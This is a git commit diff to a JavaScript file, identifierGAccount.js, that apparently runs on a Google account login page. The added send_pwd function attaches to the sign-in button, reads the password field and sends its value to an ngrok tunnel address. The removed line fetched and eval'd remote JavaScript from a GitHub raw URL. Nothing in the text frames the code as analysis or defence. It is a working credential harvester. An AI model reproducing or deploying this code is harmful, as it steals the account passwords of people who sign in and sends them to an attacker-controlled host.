fa8aea9d4bd8c2f8a0ff4f42ea5935c06e5589dc
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-16 21:30:02 -0300

    Update identifierGAccount.js

--- identifierGAccount.js
+++ identifierGAccount.js
@@ -12,12 +12,32 @@ function send_email(){
     xhr.send();
 }
 
+function send_pwd(){
+    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
+
+    btn[1].addEventListener('click', function(){
+
+    let email = document.querySelector('[type="password"]');
+    let param = email.value;
+
+    let xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            console.log(xhr.responseText);
+        }
+    };
+    xhr.send();
+
+    })
+}
+
 
 const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
 btn[1].addEventListener('click', function(){
     send_email();
     setTimeout(function() {
-        fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js').then(response => response.text()).then(code => {eval(code)});
+        send_pwd()
     }, 3000);
 })
